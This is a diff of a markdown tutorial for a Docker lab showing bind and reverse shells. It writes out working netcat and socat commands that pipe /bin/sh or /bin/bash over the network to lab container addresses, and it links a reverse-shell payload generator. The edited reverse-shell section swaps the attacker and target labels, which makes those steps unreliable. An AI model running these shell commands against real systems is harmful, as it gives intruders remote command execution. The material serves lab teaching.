@@ -32,23 +32,23 @@ Have the attacker connect to the target.
 #### Netcat
 Everybody's go-to.  Instructions below are for the neutered `netcat-openbsd` version.
 
-On `target` container interactive bash, connect to the attacker:
+[Manual](http://manned.org/nc.openbsd/5f0a5cf9)
+
+Setup listener `target`:
 ```sh
 mkfifo f
 nc -l -p 5009 0<f | /bin/bash > f 2>&1
 ```
 
-
-Find the `attacker` ip address and setup listener:
+On `attacker` container, connect to `target`:
 ```sh
-nc 172.20.0.2 5009 -vvv
+nc 172.24.0.2 5009 -vvv
 ```
 
 
 #### Socat
 Socat is a better option since you can use history and encryption with `tty`.  Target machine is likely going to have netcat installed, but once a shell session is establed, you can install other tools.
 
-[Manual](http://manned.org/nc.openbsd/6f0a5cf9)
 
 Find the `target` ip address and setup listener:
 ```sh
@@ -56,7 +56,7 @@ socat TCP-LISTEN:5009,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
 ```
 
 
-On `attacker` container interactive bash, connect to the `target`.:
+On `attacker` container interactive bash, connect to the `target`:
 ```sh
 socat FILE:`tty`,raw,echo=0 TCP4:172.24.0.2:5009
 ```
@@ -70,17 +70,11 @@ Have the target connect to the attacker.  Circumvents inbound firewall rules.
 
 #### Netcat
 
-Find the `attacker` ip address and setup listener:
-```sh
-nc -lvnp 5009 -vvv
-```
-
-
-On `target` container interactive bash, connect to the attacker:
+On the `attacker` setup listener:
 ```sh
 rm -f f 2> /dev/null
 mkfifo f
-cat f | /bin/sh -i 2>&1 | nc 172.20.0.3 5009 > f
+cat f | /bin/sh -i 2>&1 | nc 172.24.0.3 5009 > f
 
 OR
 
@@ -88,11 +82,16 @@ nc 172.24.0.3 5009 0<f | /bin/sh -i 2>&1 | tee f
 ```
 
 
+On `target` container interactive bash, connect to the attacker:
+```sh
+nc -lvnp 5009 -vvv
+```
+
+
 #### Socat
 
-Setup listener:
+Setup listener on the `attacker`:
 ```sh
-hostname -i
 socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:5009
 ```
 
@@ -147,12 +146,8 @@ If you get `connection refused`, make sure your listener is running.
 
 ## Disclaimer
 
-**This is for educational purposes.  **
+This is for educational purposes.  Do not attack unauthorized systems. 
 
 
 ## Tools
 * [Generate reverse shell payloads](https://www.revshells.com/)
-
-
-## TODO:
-* Static IP addresses for containers for ease via `docker-compose.yaml`?
